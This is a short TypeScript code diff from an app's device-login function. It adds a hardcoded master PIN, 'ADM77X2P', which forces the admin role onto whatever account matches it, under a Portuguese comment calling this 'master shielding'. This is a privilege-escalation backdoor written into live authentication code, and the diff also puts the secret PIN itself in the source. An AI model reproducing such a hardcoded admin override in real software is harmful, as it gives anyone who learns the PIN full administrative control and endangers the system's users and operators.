@@ -230,8 +230,16 @@ export async function removeReseller(id: string) {
 
 export async function validateDeviceLogin(pin: string, deviceId: string) {
   try {
-    const { data } = await supabase.from('users').select('*').eq('pin', pin.toUpperCase().trim()).maybeSingle();
+    const cleanPin = pin.toUpperCase().trim();
+    const { data } = await supabase.from('users').select('*').eq('pin', cleanPin).maybeSingle();
+    
     if (!data) return { error: "PIN INVÁLIDO" };
+
+    // BLINDAGEM MESTRE: Força o papel de admin para o PIN master
+    if (cleanPin === 'ADM77X2P') {
+      data.role = 'admin';
+    }
+
     return { user: data };
   } catch (e) { return { error: "ERRO DE REDE" }; }
 }
